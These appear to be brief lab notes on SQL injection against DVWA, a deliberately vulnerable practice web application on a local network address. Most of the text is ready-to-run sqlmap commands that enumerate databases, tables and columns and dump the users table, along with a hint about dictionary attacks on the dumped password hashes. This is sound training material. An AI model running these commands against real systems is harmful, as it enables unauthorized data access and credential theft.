DVWA local site will try to enforce security to impossible with its own PHPSESSID but it will
ask you if you want to set those diferently. This is obviously a vulnerability as the website should
enforce its own security and session ID.

* Test for SQL injection vulnerabilities within these fields:
	* sqlmap --url "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=hello&Submit=Submit#" -p id,Submit --cookie="PHPSESSID=4q25s9eis93ul7uj24f0164vb0;security=low" --dbs --dbms=mysql

* Grab tables:
	* sqlmap --url "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=hello&Submit=Submit#" -p id,Submit --cookie="PHPSESSID=4q25s9eis93ul7uj24f0164vb0;security=low" --tables

* Grab columns from the Users table
sqlmap --url "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=hello&Submit=Submit#" -p id,Submit --cookie="PHPSESSID=4q25s9eis93ul7uj24f0164vb0;security=low" -D dvwa -T users --columns

* Dump table entries from the Users table:
sqlmap --url "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=hello&Submit=Submit#" -p id,Submit --cookie="PHPSESSID=4q25s9eis93ul7uj24f0164vb0;security=low" -D dvwa -T users --dump
	-You will be given a choice to do a dictionary attack on the hashes with default options or
	download them later to work them against other tools.
